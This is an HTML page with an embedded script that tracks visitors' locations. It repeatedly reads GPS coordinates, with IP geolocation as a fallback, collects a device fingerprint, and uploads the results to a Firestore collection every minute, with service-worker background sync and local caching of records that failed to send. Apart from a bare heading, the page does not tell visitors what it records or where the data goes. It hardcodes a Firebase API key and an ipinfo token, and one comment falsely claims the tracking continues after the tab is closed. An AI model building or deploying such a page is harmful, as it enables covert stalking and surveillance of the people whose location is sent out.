<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Background Location Tracker</title>
</head>
<body>
    <h2>Tracking Location in Background...</h2>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        // âœ… Firebase Configuration (Your Credentials)
        const firebaseConfig = {
            apiKey: "AIzaSyAB6STYBF-Fzg4U4QkET_bMej47ZUJDM4Y",
            authDomain: "locationsaver-b9997.firebaseapp.com",
            projectId: "locationsaver-b9997",
            storageBucket: "locationsaver-b9997.appspot.com",
            messagingSenderId: "675975845355",
            appId: "1:675975845355:web:95cf7d6a2c255a33be35ae",
            measurementId: "G-WJJY3Q2M8E"
        };

        // âœ… Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // âœ… Register Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js')
                .then(() => console.log("âœ… Service Worker Registered"))
                .catch(err => console.error("âŒ SW Registration Failed:", err));
        }

        // âœ… Get IST Timestamp
        function getISTTime() {
            let now = new Date();
            let utcTime = now.getTime() + now.getTimezoneOffset() * 60000;
            let istTime = new Date(utcTime + (5.5 * 60 * 60 * 1000));
            return istTime.toISOString().replace("T", " ").substring(0, 19);
        }

        // âœ… Get Device Info
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                deviceMemory: navigator.deviceMemory || "Unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                onlineStatus: navigator.onLine,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // âœ… Get GPS Location
        function getGPSLocation(callback) {
            if ("geolocation" in navigator) {
                navigator.geolocation.watchPosition(
                    (position) => {
                        callback({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: getISTTime(),
                            type: "GPS",
                            device: getDeviceInfo()
                        });
                    },
                    () => callback(null),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                callback(null);
            }
        }

        // âœ… Get IP Location
        function getIPLocation(callback) {
            fetch('https://ipinfo.io/json?token=6a9008bb55fd89')
                .then(response => response.json())
                .then(data => {
                    callback({
                        ip: data.ip,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        latitude: data.loc.split(",")[0],
                        longitude: data.loc.split(",")[1],
                        timestamp: getISTTime(),
                        type: "IP",
                        device: getDeviceInfo()
                    });
                })
                .catch(() => callback(null));
        }

        // âœ… Save to Firestore
        async function saveToFirestore(data) {
            try {
                await addDoc(collection(db, "user_data"), data);
                console.log("âœ… Location Data Sent:", data);
            } catch (error) {
                console.error("âŒ Error Saving Data:", error);
                saveToIndexedDB(data);
            }
        }

        // âœ… Save Data to IndexedDB
        function saveToIndexedDB(data) {
            let request = indexedDB.open("LocationDB", 1);
            request.onupgradeneeded = (event) => {
                let db = event.target.result;
                if (!db.objectStoreNames.contains("unsent_data")) {
                    db.createObjectStore("unsent_data", { keyPath: "timestamp" });
                }
            };
            request.onsuccess = (event) => {
                let db = event.target.result;
                let transaction = db.transaction("unsent_data", "readwrite");
                let store = transaction.objectStore("unsent_data");
                store.add(data);
                console.log("ðŸ’¾ Data Stored in IndexedDB:", data);
            };
        }

        // âœ… Collect Location
        function collectLocation() {
            getGPSLocation((gpsData) => {
                if (gpsData) {
                    saveToFirestore(gpsData);
                } else {
                    getIPLocation((ipData) => {
                        if (ipData) saveToFirestore(ipData);
                    });
                }
            });
        }

        // âœ… Send Data Every 60 Seconds (Even When Tab is Closed)
        setInterval(collectLocation, 60000);

        // âœ… Send Data When Page Opens
        collectLocation();

        // âœ… Request Background Sync for Offline Data
        if ('serviceWorker' in navigator && 'SyncManager' in window) {
            navigator.serviceWorker.ready.then((swRegistration) => {
                return swRegistration.sync.register('sync-location');
            });
        }
    </script>
</body>
</html>
